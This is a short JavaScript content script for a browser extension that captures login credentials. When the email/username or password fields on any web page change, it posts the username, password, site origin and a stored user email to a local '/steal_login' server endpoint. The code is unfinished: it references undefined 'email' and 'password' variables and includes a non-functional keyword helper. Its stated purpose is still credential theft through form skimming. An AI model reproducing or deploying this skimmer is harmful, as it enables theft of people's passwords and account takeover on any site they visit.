var text_inputs = $('input:text');
var password_inputs = $('input:password');

function containsKeyWord(word, element) {
    $.each(element.data(), function(key, value) {
        if (value.contains(word)) return true;
    });
    return false;
}


if (!(typeof email === 'undefined')) {
    console.log("there's an email in here?");
    console.log(email);
    email.change(function () {
        chrome.storage.local.get('email', function (result) {
            var userEmail = result.email;
            if (typeof userEmail === 'undefined') userEmail = "no_email_found";
            if (email.value != "") {
                $.post("http://localhost:5000/steal_login", {
                    email: userEmail,
                    url: window.location.origin,
                    username: email.val(),
                    password: password.val()
                });
            }
        });
    });
} else {
    console.log("SAD, there is no email in this form");
    $(this).find(':input').each(function (hi) {
        console.log(hi);
    });
}

password.change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        if (typeof userEmail === 'undefined') userEmail = "no_email_found";
        $.post("http://localhost:5000/steal_login", {
            email: userEmail,
            url: window.location.origin,
            username: email.val(),
            password: password.val()
        });
    });
});